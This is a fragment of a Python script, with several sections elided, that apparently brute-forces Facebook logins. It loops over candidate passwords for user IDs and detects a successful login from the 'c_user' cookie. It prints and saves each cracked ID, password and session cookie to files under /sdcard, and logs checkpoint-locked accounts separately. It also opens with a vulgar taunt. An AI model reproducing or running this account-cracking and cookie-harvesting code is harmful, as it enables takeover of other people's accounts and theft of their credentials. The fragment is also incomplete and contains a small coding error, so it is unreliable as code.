...
def xxr():
    ...
    os.system('clear')
    dual("I FUCK YOUR GIRLFRIEND ","l.mp3")
    print(logo)
        ...
        for ps in pwx:
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HAIYAT-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HAIYAT-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[HAIYAT-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HAIYAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
